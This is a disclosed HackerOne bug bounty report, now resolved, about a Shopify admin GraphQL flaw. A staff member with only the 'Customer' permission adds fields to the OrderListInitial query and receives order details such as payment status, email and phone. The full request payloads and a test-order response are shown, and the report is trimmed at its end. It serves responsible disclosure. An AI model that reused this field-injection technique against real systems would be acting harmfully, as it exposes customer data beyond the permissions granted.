# [M] OrderListInitial leaks order details

## Summary
Severity: Medium (CVSS 5.0)
Program: Shopify
Weakness: Information Disclosure
Reporter: sreeju_kc
State: resolved
Disclosed: 2020-08-18T19:52:15.050Z
Source: https://hackerone.com/reports/882412

## Details
Hello,

During my investigation I have noticed that OrderListInitial graphql operation is leaking more information that it suppose to be for a staff with "Customer" only permission.

Normally the graphql call is as below.

POST /admin/internal/web/graphql/core HTTP/1.1
{"operationName":"OrderListInitial","variables":{},"query":"query OrderListInitial {\n  localDeliveryEnabled\n  shop {\n    id\n    ordersDelayedSince\n    appLinks(type: ORDERS, location: INDEX) {\n      id\n      text\n      url\n      icon {\n        transformedSrc(maxWidth: 80)\n        __typename\n      }\n      __typename\n    }\n    appActions: appLinks(type: ORDERS, location: ACTION) {\n      id\n      text\n      url\n      icon {\n        transformedSrc(maxWidth: 80)\n        __typename\n      }\n      __typename\n    }\n    plan {\n      trial\n      __typename\n    }\n    showInstallMobileAppBanner\n    features {\n      fraudProtectEligibility\n      eligibleForBulkLabelPurchase\n      __typename\n    }\n    currencyCode\n    __typename\n  }\n  locationsExist: locations(first: 2, includeLegacy: true) {\n    edges {\n      node {\n        id\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  ordersAll: orders(first: 1, reverse: true) {\n    edges {\n      node {\n        id\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

and the response is below.

"ordersAll":{"edges":[{"node":{"id":"gid:\/\/shopify\/Order\/1936560029718","__typename":"Order"},"__typename":"OrderEdge"}],"__typename":"OrderConnection"}},

But when included more fields in the call as below.

{"operationName":"OrderListInitial","variables":{},"query":"query OrderListInitial {\n  localDeliveryEnabled\n  shop {\n    id\n    ordersDelayedSince\n    appLinks(type: ORDERS, location: INDEX) {\n      id\n      text\n      url\n      icon {\n        transformedSrc(maxWidth: 80)\n        __typename\n      }\n      __typename\n    }\n    appActions: appLinks(type: ORDERS, location: ACTION) {\n      id\n      text\n      url\n      icon {\n        transformedSrc(maxWidth: 80)\n        __typename\n      }\n      __typename\n    }\n    plan {\n      trial\n      __typename\n    }\n    showInstallMobileAppBanner\n    features {\n      fraudProtectEligibility\n      eligibleForBulkLabelPurchase\n      __typename\n    }\n    currencyCode\n    __typename\n  }\n  locationsExist: locations(first: 2, includeLegacy: true) {\n    edges {\n      node {\n        id\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  ordersAll: orders(first: 1, reverse: true) {\n    edges {\n      node {\n        id\n   billingAddressMatchesShippingAddress\n  canMarkAsPaid\n  canMarkAsPaid\n   capturable\n clientIp\n  createdAt\n  discountCode\n  displayFinancialStatus \n displayFulfillmentStatus\n edited\n email\n fulfillable\n fullyPaid\n merchantEditable\n name\n note\n paymentGatewayNames\n phone\n  refundable\n requiresShipping\n restockable\n  unpaid\n  __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

The response i received is below.

"ordersAll":{"edges":[{"node":{"id":"gid:\/\/shopify\/Order\/1936560029718","
billingAddressMatchesShippingAddress":false,
"canMarkAsPaid":true,
"capturable":false,
"clientIp":null,
"createdAt":"2020-05-24T21:13:29Z",
"discountCode":null,
"displayFinancialStatus":"PENDING",
"displayFulfillmentStatus":"UNFULFILLED",
"edited":false,
"email":null,
"fulfillable":true,
"fullyPaid":false,
"merchantEditable":false,
"name":"#1006#",
"note":null,
"paymentGatewayNames":["Test"],
"phone":null,
"refundable":false,

_Trimmed to 38 lines — full report: https://hackerone.com/reports/882412_
